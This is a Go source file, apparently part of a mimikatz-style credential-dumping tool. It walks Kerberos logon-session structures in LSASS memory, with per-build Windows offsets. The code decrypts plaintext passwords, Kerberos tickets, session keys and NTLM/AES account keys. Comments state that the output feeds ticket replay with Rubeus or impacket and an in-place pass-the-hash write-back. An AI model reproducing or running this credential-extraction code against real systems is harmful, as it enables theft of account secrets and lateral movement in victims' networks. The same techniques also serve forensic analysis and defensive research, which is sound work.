package sekurlsa

import (
	"encoding/binary"
	"fmt"
	"strings"
)

// KerberosLayout captures every offset the Kerberos walker needs to
// project a KIWI_KERBEROS_LOGON_SESSION node + its three ticket
// caches. Set NodeSize=0 to disable.
//
// Two structural anchors live at fixed offsets across every Vista+
// build (KvcForensic + pypykatz agree):
//
//   - KIWI_KERBEROS_EXTERNAL_NAME at +0x00 NameType (u32) +
//     +0x04 NameCount (u32) + +0x08 first UNICODE_STRING (16 bytes).
//   - The walker hardcodes those — no Layout field exposed.
type KerberosLayout struct {
	NodeSize uint32

	// Session-node fields.
	LUIDOffset     uint32
	UserNameOffset uint32 // UNICODE_STRING (16 bytes)
	DomainOffset   uint32 // UNICODE_STRING
	PasswordOffset uint32 // UNICODE_STRING (encrypted)

	// LUIDFallbackOffsets tries each in order if the primary LUID
	// reads as 0 (Microsoft has shifted the LUID's position in the
	// node across LCUs). Optional — leave nil to skip the fallback
	// scan.
	LUIDFallbackOffsets []uint32

	// TicketListOffsets is the slice of pointer-to-LIST_ENTRY values
	// inside the session node. Each pointer is the head of a
	// doubly-linked list of KIWI_KERBEROS_INTERNAL_TICKET nodes.
	// Typical Win 7+ session has 3 caches at offsets 280, 304, 328.
	TicketListOffsets []uint32

	// Per-ticket field offsets inside KIWI_KERBEROS_INTERNAL_TICKET.
	TicketServiceNameOffset uint32 // KIWI_KERBEROS_EXTERNAL_NAME*
	TicketTargetNameOffset  uint32 // KIWI_KERBEROS_EXTERNAL_NAME*
	TicketClientNameOffset  uint32 // KIWI_KERBEROS_EXTERNAL_NAME*
	TicketFlagsOffset       uint32 // u32
	TicketKeyTypeOffset     uint32 // u32 — etype: 17=AES128, 18=AES256, 23=RC4-HMAC, 1/3=DES
	TicketEncTypeOffset     uint32 // u32 — kerb-encType
	TicketKvnoOffset        uint32 // u32
	TicketBufferLenOffset   uint32 // u32 (the ticket buffer's length)
	TicketBufferPtrOffset   uint32 // u64 (pointer to the ASN.1 ticket bytes)

	// TicketSessionKey* — offsets of the embedded KIWI_KERBEROS_BUFFER
	// that holds the per-ticket session key. The session key is what
	// kirbi-export populates so that downstream tooling (Rubeus,
	// impacket) can replay the ticket. The long-term account keys
	// (NTLM/AES128/AES256) live in KIWI_KERBEROS_KEYS_LIST_6 and are
	// walked separately by walkKerberosHashes.
	//
	// Layout of the embedded buffer (8-byte alignment after KeyType):
	//
	//	{KeyType DWORD ; pad ; Length DWORD ; Value PBYTE}
	//
	// pypykatz reference offsets per variant:
	//
	//	TICKET_10_1607 (Win 10 1607+): KeyLen=0xB8 KeyVal=0xC0
	//	TICKET_11      (Win 11 21H2+): KeyLen=0xB8 KeyVal=0xC0
	//	TICKET_6       (Win 7 SP1+):   KeyLen=0xA0 KeyVal=0xA8
	//
	// Set both to zero to disable session-key extraction (KerberosTicket
	// .SessionKey stays nil; ToKirbi emits an empty KeyValue).
	TicketSessionKeyLenOffset uint32 // u32 — Length DWORD
	TicketSessionKeyPtrOffset uint32 // u64 — pointer to the encrypted bytes

	// TicketNodeSize is the smallest ticket size that covers every
	// offset above. Set to ≥ TicketBufferPtrOffset+8 — defaults to
	// 0x180 if zero.
	TicketNodeSize uint32
}

// KerberosPrimaryCredentialLayout describes the per-build offsets
// for the inline KIWI_KERBEROS_10_PRIMARY_CREDENTIAL[_1607] inside
// the session node and the flat KERB_HASHPASSWORD_* array hanging
// off `pKeyList` (a KIWI_KERBEROS_KEYS_LIST_6 header followed by
// `cbItem` entries). Set HashEntrySize=0 to disable per-etype hash
// extraction.
//
// Build coverage (x64, sourced from agent research mining mimikatz
// + pypykatz + KvcForensic):
//
//   - 1507/1511 (`_10` + `_6`):  PKeyListOffset=0x108
//                                HashEntrySize=48
//                                HashGenericOffset=0x18
//                                KeysListHeaderSize=24
//   - 1607–22H2 + Win11 21H2/22H2/23H2 (`_10_1607` + `_6_1607`):
//                                PKeyListOffset=0x118
//                                HashEntrySize=56
//                                HashGenericOffset=0x20
//                                KeysListHeaderSize=40
//   - Win11 24H2 (`_24H2` + `_6_1607`):
//                                PKeyListOffset=0x0F8 (unk13 dropped)
//                                HashEntrySize=56
//                                HashGenericOffset=0x20
//                                KeysListHeaderSize=40
type KerberosPrimaryCredentialLayout struct {
	// PKeyListOffset — PVOID inside the KIWI_KERBEROS_LOGON_SESSION
	// node pointing at a KIWI_KERBEROS_KEYS_LIST_6 header.
	PKeyListOffset uint32

	// KeysListHeaderSize — number of bytes between the start of
	// KIWI_KERBEROS_KEYS_LIST_6 and its first KERB_HASHPASSWORD
	// entry. 24 for `_5` (pre-Win10), 40 for `_6` (Win10+).
	KeysListHeaderSize uint32

	// KeysListCbItemOffset — uint32 cbItem field inside the keys-
	// list header. Stable at 0x04 across builds.
	KeysListCbItemOffset uint32

	// HashEntrySize — total size of one KERB_HASHPASSWORD_* entry
	// in the flat array. 40 for `_5`, 48 for `_6`, 56 for
	// `_6_1607`.
	HashEntrySize uint32

	// HashGenericOffset — offset of the embedded
	// KERB_HASHPASSWORD_GENERIC inside one entry. 0x10/0x18/0x20
	// per the trio above.
	HashGenericOffset uint32

	// GenericTypeOffset — uint32 etype (RC4=23, AES128=17,
	// AES256=18, DES=1/3) inside the GENERIC. Stable at 0x00.
	GenericTypeOffset uint32

	// GenericSizeOffset — uintptr size of the cipher buffer.
	// Stable at 0x08.
	GenericSizeOffset uint32

	// GenericChecksumPtrOff — pointer to the encrypted hash bytes
	// in source-process VA. Stable at 0x10.
	GenericChecksumPtrOff uint32
}

// KerberosHashEntry is one decoded per-etype hash from a session's
// pKeyList. Plaintext is the decrypted hash bytes (16 for
// NT/AES128, 32 for AES256). CipherVA + CipherLen feed the Pass-
// the-Hash write-back at pth_windows.go.
type KerberosHashEntry struct {
	Etype     uint32
	CipherVA  uint64
	CipherLen uint32
	Plaintext []byte
}

// KerberosTicket is one entry from a session's ticket cache. Buffer
// is the ASN.1-encoded ticket bytes — feed them to a downstream
// Kerberos parser (e.g., impacket / Rubeus / pypykatz's `kerberos
// ccache`) for protocol-level inspection.
type KerberosTicket struct {
	ServiceName string // e.g., "krbtgt"
	TargetName  string // e.g., "DOMAIN.LOCAL"
	ClientName  string // e.g., "alice@CORP.LOCAL"
	Flags       uint32
	KeyType     uint32 // 17=AES128, 18=AES256, 23=RC4-HMAC
	EncType     uint32
	KVNO        uint32
	Buffer      []byte

	// SessionKey is the decrypted per-ticket session key — what
	// downstream Kerberos tooling needs to replay the ticket against
	// the service. 16 bytes for RC4/AES128, 32 bytes for AES256.
	// Populated only when the build's KerberosLayout registers
	// TicketSessionKey* offsets and the LSA decrypt succeeds.
	SessionKey []byte
}

// KerberosCredential is the credential payload extracted from a
// single Kerberos logon session. Password is the plaintext after
// LSA decrypt (rarely populated outside fresh-logon sessions).
// Tickets is the union of every cache (TGT + TGS + …) we walked.
type KerberosCredential struct {
	UserName    string
	LogonDomain string
	Password    string
	Tickets     []KerberosTicket

	// Hashes carries the per-etype long-term keys decoded from the
	// session's KIWI_KERBEROS_KEYS_LIST_6 array (when the build's
	// Template registers a non-zero KerberosPrimaryCredLayout).
	// Populated by walkKerberosHashes; consumed by the PTH write-
	// back at credentials/sekurlsa/pth_windows.go to overwrite the
	// per-etype cipher bytes in place. Empty on builds with no
	// registered layout.
	Hashes []KerberosHashEntry

	Found bool
}

// AuthPackage satisfies the Credential interface.
func (KerberosCredential) AuthPackage() string { return "Kerberos" }

// String renders Domain\User:Password with a ticket-count summary —
// log-friendly without dumping the full ticket buffers.
func (c KerberosCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	return fmt.Sprintf("%s:%s [%d ticket(s)]", user, c.Password, len(c.Tickets))
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
// Plaintext password + every ticket buffer are sensitive — zeroize
// before discarding.
func (c *KerberosCredential) wipe() {
	c.Password = ""
	for i := range c.Tickets {
		for j := range c.Tickets[i].Buffer {
			c.Tickets[i].Buffer[j] = 0
		}
		c.Tickets[i].Buffer = nil
		for j := range c.Tickets[i].SessionKey {
			c.Tickets[i].SessionKey[j] = 0
		}
		c.Tickets[i].SessionKey = nil
	}
	c.Tickets = nil
	c.Found = false
}

// extractKerberos walks kerberos.dll's KIWI_KERBEROS_LOGON_SESSION
// AVL tree and returns one KerberosCredential per LUID. Each
// credential carries the decrypted password (when present) plus
// every ticket from the session's caches.
//
// Returns (nil, nil) without warning when the template lacks
// Kerberos support (KerberosLayout.NodeSize == 0).
//
// Vista+ Kerberos uses an RTL_AVL_TABLE for session enumeration —
// the rel32 lands on the table's BalancedRoot (sentinel), and the
// actual tree root is `BalancedRoot.RightChild` (table+0x10). We
// recursively in-order walk every node and project each through
// the layout.
func extractKerberos(r *reader, kerbModule Module, t *Template, lsaKey *lsaKey) (map[uint64]*KerberosCredential, []string) {
	if t.KerberosLayout.NodeSize == 0 || len(t.KerberosListPattern) == 0 {
		return nil, nil
	}

	body, err := r.ReadVA(kerbModule.BaseOfImage, int(kerbModule.SizeOfImage))
	if err != nil {
		return nil, []string{fmt.Sprintf("Kerberos: read kerberos.dll body: %v", err)}
	}

	globalVA, err := derefRel32(
		body,
		kerbModule.BaseOfImage,
		t.KerberosListPattern,
		t.KerberosListWildcards,
		t.KerberosListOffset,
		r,
	)
	if err != nil {
		return nil, []string{fmt.Sprintf("Kerberos list head: %v", err)}
	}

	// Kerberos has one indirection more than Wdigest/DPAPI/MSV: the
	// LEA target is the address of a *pointer* to the RTL_AVL_TABLE,
	// not the table itself. Pypykatz's
	//   ptr_entry_loc = get_ptr_with_offset(...)   # derefRel32 result
	//   ptr_entry     = get_ptr(ptr_entry_loc)     # extra dereference
	// flow makes this explicit. Without the extra readPointer we
	// walk a tree rooted at the .data slot's bytes, which produces
	// junk LUIDs and unaligned-looking sessions.
	tableVA, err := readPointer(r, globalVA)
	if err != nil || tableVA == 0 {
		return nil, nil
	}

	// The table's BalancedRoot sentinel sits at offset 0; the actual
	// tree root is BalancedRoot.RightChild (offset +0x10).
	treeRoot := readAVLTreeRoot(r, tableVA)
	if treeRoot == 0 {
		return nil, nil
	}

	creds := make(map[uint64]*KerberosCredential)
	var warnings []string

	const maxNodes = 1024
	walkAVL(r, treeRoot, maxNodes, func(avlNode uint64) {
		// The AVL node is [RTL_BALANCED_LINKS (0x20)][user_data].
		// Per pypykatz, user_data at +0x20 is a pointer to the
		// actual KIWI_KERBEROS_LOGON_SESSION struct — read it.
		sessionPtr, err := readPointer(r, avlNode+avlNodeUserDataOffset)
		if err != nil || sessionPtr == 0 {
			return
		}
		node, err := r.ReadVA(sessionPtr, int(t.KerberosLayout.NodeSize))
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("Kerberos session @0x%X: %v", sessionPtr, err))
			return
		}
		cred, luid, warn := decodeKerberosSession(r, node, t, lsaKey)
		if warn != "" {
			warnings = append(warnings, warn)
		}
		if cred.Found && luid != 0 {
			// Coalesce duplicate LUIDs — keep the entry with the
			// longest ticket cache (multiple AVL paths can lead to
			// the same session in malformed dumps).
			if existing, ok := creds[luid]; !ok || len(cred.Tickets) > len(existing.Tickets) {
				c := cred
				creds[luid] = &c
			}
		}
	})

	return creds, warnings
}

// decodeKerberosSession projects a node-bytes blob through the
// layout to a (KerberosCredential, LUID). On read errors the
// session is skipped with a non-fatal warning.
func decodeKerberosSession(r *reader, node []byte, t *Template, lsaKey *lsaKey) (KerberosCredential, uint64, string) {
	l := t.KerberosLayout
	if uint32(len(node)) < l.NodeSize {
		return KerberosCredential{}, 0, fmt.Sprintf("Kerberos node too small: %d < %d", len(node), l.NodeSize)
	}

	luid := binary.LittleEndian.Uint64(node[l.LUIDOffset : l.LUIDOffset+8])
	// LUID fallback scan: trigger when the primary read is zero OR
	// when the read has its upper 32 bits set (real LUIDs allocated
	// by NT are sequential from 1 and stay well under 2^32 in
	// practice — an upper-32 bit non-zero value is almost always
	// a stray pointer or unrelated field misread). Try each
	// alternate offset until a plausible LUID surfaces.
	if luid == 0 || luid>>32 != 0 {
		for _, off := range l.LUIDFallbackOffsets {
			if off+8 > l.NodeSize {
				continue
			}
			v := binary.LittleEndian.Uint64(node[off : off+8])
			if v != 0 && v>>32 == 0 {
				luid = v
				break
			}
		}
	}

	username := readUnicodeString(r, node[l.UserNameOffset:l.UserNameOffset+16])
	domain := readUnicodeString(r, node[l.DomainOffset:l.DomainOffset+16])

	// Password (UNICODE_STRING with encrypted Buffer). Decryption
	// failure is non-fatal — we still return tickets if present.
	var password string
	pwdField := node[l.PasswordOffset : l.PasswordOffset+16]
	pwdLen := binary.LittleEndian.Uint16(pwdField[0:2])
	pwdBufPtr := binary.LittleEndian.Uint64(pwdField[8:16])
	if pwdLen > 0 && pwdBufPtr != 0 {
		if ct, err := r.ReadVA(pwdBufPtr, int(pwdLen)); err == nil {
			if pt, err := decryptLSA(ct, lsaKey); err == nil {
				password = decodeUTF16LEBytes(pt)
			}
		}
	}

	// Walk every ticket cache pointed to by the session node. Each
	// "ticket list" is an embedded LIST_ENTRY whose Flink heads the
	// chain of KIWI_KERBEROS_INTERNAL_TICKET nodes.
	var tickets []KerberosTicket
	for _, listOff := range l.TicketListOffsets {
		if listOff+16 > l.NodeSize {
			continue
		}
		flink := binary.LittleEndian.Uint64(node[listOff : listOff+8])
		if flink == 0 {
			continue
		}
		tickets = append(tickets, walkKerberosTickets(r, flink, l, lsaKey)...)
	}

	// Walk per-etype hash entries (chantier II.5 — feeds the
	// PTH-Kerberos write-back). Disabled when the build's Template
	// has not registered a KerberosPrimaryCredLayout
	// (HashEntrySize == 0).
	hashes, hashWarns := walkKerberosHashes(r, 0, node, t.KerberosPrimaryCredLayout, lsaKey)
	warn := ""
	if len(hashWarns) > 0 {
		warn = strings.Join(hashWarns, "; ")
	}

	cred := KerberosCredential{
		UserName:    username,
		LogonDomain: domain,
		Password:    password,
		Tickets:     tickets,
		Hashes:      hashes,
		Found:       username != "" || password != "" || len(tickets) > 0 || len(hashes) > 0,
	}
	return cred, luid, warn
}

// walkKerberosHashes reads the per-LUID KIWI_KERBEROS_KEYS_LIST_6
// header at sessionNode+pkl.PKeyListOffset and walks the
// `cbItem`-long flat array of KERB_HASHPASSWORD_* entries that
// follows. Each entry's GENERIC sub-struct yields the etype +
// cipher VA + cipher length we need for the Pass-the-Hash write-
// back. The cipher is decrypted with the same lsasrv 3DES/AES key
// chain as MSV — no Kerberos-specific KDF.
//
// Returns nil + warning when the layout is disabled (HashEntrySize
// == 0) or the keys-list pointer is null. A successful walk yields
// one entry per registered etype; entries with zero-length ciphers
// are dropped silently. Caller-side write-back keys off the etype
// to pick the right operator-supplied target hash.
//
// Sanity caps: cbItem > 32 is treated as junk and the walk aborts.
func walkKerberosHashes(r *reader, sessionVA uint64, sessionNode []byte, pkl KerberosPrimaryCredentialLayout, lsaKey *lsaKey) ([]KerberosHashEntry, []string) {
	if pkl.HashEntrySize == 0 {
		return nil, nil
	}
	if uint32(len(sessionNode)) < pkl.PKeyListOffset+8 {
		return nil, []string{fmt.Sprintf("Kerberos: session node too small for pKeyList @0x%X (len=%d)",
			pkl.PKeyListOffset, len(sessionNode))}
	}
	pKeyList := binary.LittleEndian.Uint64(
		sessionNode[pkl.PKeyListOffset : pkl.PKeyListOffset+8])
	if pKeyList == 0 {
		return nil, nil
	}
	hdr, err := r.ReadVA(pKeyList, int(pkl.KeysListHeaderSize))
	if err != nil {
		return nil, []string{fmt.Sprintf("Kerberos: read keys-list header @0x%X: %v", pKeyList, err)}
	}
	if uint32(len(hdr)) < pkl.KeysListCbItemOffset+4 {
		return nil, []string{fmt.Sprintf("Kerberos: keys-list header @0x%X shorter than cbItem offset", pKeyList)}
	}
	cbItem := binary.LittleEndian.Uint32(
		hdr[pkl.KeysListCbItemOffset : pkl.KeysListCbItemOffset+4])
	if cbItem == 0 || cbItem > 32 {
		return nil, nil
	}
	out := make([]KerberosHashEntry, 0, cbItem)
	var warnings []string
	for i := uint32(0); i < cbItem; i++ {
		entryVA := pKeyList + uint64(pkl.KeysListHeaderSize) + uint64(i)*uint64(pkl.HashEntrySize)
		genVA := entryVA + uint64(pkl.HashGenericOffset)
		gen, err := r.ReadVA(genVA, 24) // KERB_HASHPASSWORD_GENERIC is fixed 24 bytes
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("Kerberos: read GENERIC @0x%X: %v", genVA, err))
			continue
		}
		etype := binary.LittleEndian.Uint32(gen[pkl.GenericTypeOffset : pkl.GenericTypeOffset+4])
		size := binary.LittleEndian.Uint64(gen[pkl.GenericSizeOffset : pkl.GenericSizeOffset+8])
		cipherVA := binary.LittleEndian.Uint64(gen[pkl.GenericChecksumPtrOff : pkl.GenericChecksumPtrOff+8])
		if size == 0 || size > 64 || cipherVA == 0 {
			continue
		}
		cipher, err := r.ReadVA(cipherVA, int(size))
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("Kerberos: read cipher @0x%X (etype %d): %v", cipherVA, etype, err))
			continue
		}
		plain, err := decryptLSA(cipher, lsaKey)
		if err != nil {
			warnings = append(warnings, fmt.Sprintf("Kerberos: decrypt cipher @0x%X (etype %d): %v", cipherVA, etype, err))
			continue
		}
		out = append(out, KerberosHashEntry{
			Etype:     etype,
			CipherVA:  cipherVA,
			CipherLen: uint32(size),
			Plaintext: plain,
		})
	}
	_ = sessionVA // reserved for future use (PTH-side debug)
	return out, warnings
}

// walkKerberosTickets follows a ticket cache's Flink chain and reads
// every ticket found, capped at 256 to defeat malformed dumps.
//
// The ticket-list head lives INSIDE the session node (an embedded
// LIST_ENTRY), so we don't have a separate "list head VA" to compare
// against for loop termination. The walk terminates on:
//   - the 256-ticket cap, or
//   - a self-pointer (Flink == cur), or
//   - any ReadVA failure on the next node.
// In practice every Kerberos cache wraps within ~16 tickets so the
// cap never trips on a healthy dump.
func walkKerberosTickets(r *reader, head uint64, l KerberosLayout, lsaKey *lsaKey) []KerberosTicket {
	var out []KerberosTicket
	// Real Kerberos cache wraps within ~5-20 tickets per session;
	// 32 is a generous cap that limits junk-ticket runaway when our
	// per-build offsets are misaligned and we end up walking arbitrary
	// memory. Per-build field-offset refinement is queued for v0.30.x.
	const maxTickets = 32
	tnSize := l.TicketNodeSize
	if tnSize == 0 {
		tnSize = 0x180
	}

	walked := 0
	cur := head
	for cur != 0 && walked < maxTickets {
		ticket, err := readKerberosTicket(r, cur, l, tnSize, lsaKey)
		if err != nil {
			break
		}
		out = append(out, ticket)
		next, err := readPointer(r, cur)
		if err != nil || next == 0 || next == cur {
			break
		}
		cur = next
		walked++
	}
	return out
}

// readKerberosTicket reads one KIWI_KERBEROS_INTERNAL_TICKET at the
// given VA and projects it through the layout's per-ticket offsets.
// When lsaKey is non-nil and the layout registers TicketSessionKey*
// offsets, decrypts the per-ticket session key in place and stores
// it on the returned KerberosTicket.SessionKey.
func readKerberosTicket(r *reader, va uint64, l KerberosLayout, tnSize uint32, lsaKey *lsaKey) (KerberosTicket, error) {
	node, err := r.ReadVA(va, int(tnSize))
	if err != nil {
		return KerberosTicket{}, err
	}

	t := KerberosTicket{}

	// Names — each is a pointer to a KIWI_KERBEROS_EXTERNAL_NAME
	// struct whose first UNICODE_STRING sits at +8. readExternalName
	// returns "" on any read failure.
	if l.TicketServiceNameOffset+8 <= tnSize {
		t.ServiceName = readExternalName(r, binary.LittleEndian.Uint64(
			node[l.TicketServiceNameOffset:l.TicketServiceNameOffset+8]))
	}
	if l.TicketTargetNameOffset+8 <= tnSize {
		t.TargetName = readExternalName(r, binary.LittleEndian.Uint64(
			node[l.TicketTargetNameOffset:l.TicketTargetNameOffset+8]))
	}
	if l.TicketClientNameOffset+8 <= tnSize {
		t.ClientName = readExternalName(r, binary.LittleEndian.Uint64(
			node[l.TicketClientNameOffset:l.TicketClientNameOffset+8]))
	}

	if l.TicketFlagsOffset+4 <= tnSize {
		t.Flags = binary.LittleEndian.Uint32(node[l.TicketFlagsOffset : l.TicketFlagsOffset+4])
	}
	if l.TicketKeyTypeOffset+4 <= tnSize {
		t.KeyType = binary.LittleEndian.Uint32(node[l.TicketKeyTypeOffset : l.TicketKeyTypeOffset+4])
	}
	if l.TicketEncTypeOffset+4 <= tnSize {
		t.EncType = binary.LittleEndian.Uint32(node[l.TicketEncTypeOffset : l.TicketEncTypeOffset+4])
	}
	if l.TicketKvnoOffset+4 <= tnSize {
		t.KVNO = binary.LittleEndian.Uint32(node[l.TicketKvnoOffset : l.TicketKvnoOffset+4])
	}

	if l.TicketBufferLenOffset+4 <= tnSize && l.TicketBufferPtrOffset+8 <= tnSize {
		bufLen := binary.LittleEndian.Uint32(node[l.TicketBufferLenOffset : l.TicketBufferLenOffset+4])
		bufPtr := binary.LittleEndian.Uint64(node[l.TicketBufferPtrOffset : l.TicketBufferPtrOffset+8])
		// Cap at 64KB — real Kerberos tickets are well under 16KB,
		// anything larger signals a corrupted dump or wrong layout.
		if bufLen > 0 && bufLen < 65536 && bufPtr != 0 {
			if buf, err := r.ReadVA(bufPtr, int(bufLen)); err == nil {
				out := make([]byte, len(buf))
				copy(out, buf)
				t.Buffer = out
			}
		}
	}

	// Per-ticket session key — only when the layout registers the
	// embedded KIWI_KERBEROS_BUFFER and the LSA crypto chain is
	// available. The cipher is encrypted with the same lsasrv key
	// chain as MSV / Wdigest / per-etype hashes; decryption failures
	// are silent (returned KerberosTicket.SessionKey stays nil and
	// downstream kirbi export emits an empty KeyValue).
	if lsaKey != nil &&
		l.TicketSessionKeyLenOffset+4 <= tnSize &&
		l.TicketSessionKeyPtrOffset+8 <= tnSize {
		keyLen := binary.LittleEndian.Uint32(
			node[l.TicketSessionKeyLenOffset : l.TicketSessionKeyLenOffset+4])
		keyPtr := binary.LittleEndian.Uint64(
			node[l.TicketSessionKeyPtrOffset : l.TicketSessionKeyPtrOffset+8])
		// Cap at 256 — Kerberos long-term + session keys are 16/32
		// bytes for AES, anything larger is junk from a misaligned
		// layout. cipher length is the plaintext-aligned ciphertext
		// (same length as plaintext for stream cipher; AES round-up).
		if keyLen > 0 && keyLen <= 256 && keyPtr != 0 {
			if cipher, err := r.ReadVA(keyPtr, int(keyLen)); err == nil {
				if plain, err := decryptLSA(cipher, lsaKey); err == nil {
					t.SessionKey = plain
				}
			}
		}
	}

	return t, nil
}

// readExternalName dereferences a KIWI_KERBEROS_EXTERNAL_NAME
// pointer and returns its first UNICODE_STRING component as a Go
// string. Multi-component names join with "/".
//
// Layout (stable across builds):
//
//	+0x00  NameType  uint16
//	+0x02  pad
//	+0x04  NameCount uint16
//	+0x08  first UNICODE_STRING (16 bytes; KvcForensic
//	       external_name_first_string_offset = 8)
//	+0x18  second UNICODE_STRING …
func readExternalName(r *reader, ptr uint64) string {
	if ptr == 0 {
		return ""
	}
	const headerSize = 8
	header, err := r.ReadVA(ptr, headerSize)
	if err != nil {
		return ""
	}
	count := binary.LittleEndian.Uint16(header[4:6])
	if count == 0 || count > 16 {
		return ""
	}

	parts := make([]string, 0, count)
	for i := uint16(0); i < count; i++ {
		field, err := r.ReadVA(ptr+8+uint64(i)*16, 16)
		if err != nil {
			break
		}
		parts = append(parts, readUnicodeString(r, field))
	}
	return joinNonEmpty(parts, "/")
}

// joinNonEmpty joins non-empty strings with sep — stdlib strings.Join
// would emit "alice//corp" if any component is empty, which we don't
// want for partial reads.
func joinNonEmpty(parts []string, sep string) string {
	out := ""
	for _, p := range parts {
		if p == "" {
			continue
		}
		if out != "" {
			out += sep
		}
		out += p
	}
	return out
}

// mergeKerberos grafts Kerberos credentials onto matching
// LogonSessions by LUID, mirroring mergeWdigest / mergeDPAPI /
// mergeTSPkg semantics. Orphan Kerberos LUIDs surface as new
// sessions.
func mergeKerberos(sessions []LogonSession, kerb map[uint64]*KerberosCredential) []LogonSession {
	return mergeByLUID(sessions, kerb, func(luid uint64, c *KerberosCredential) LogonSession {
		return LogonSession{
			LUID:        luid,
			UserName:    c.UserName,
			LogonDomain: c.LogonDomain,
			Credentials: []Credential{c},
		}
	})
}
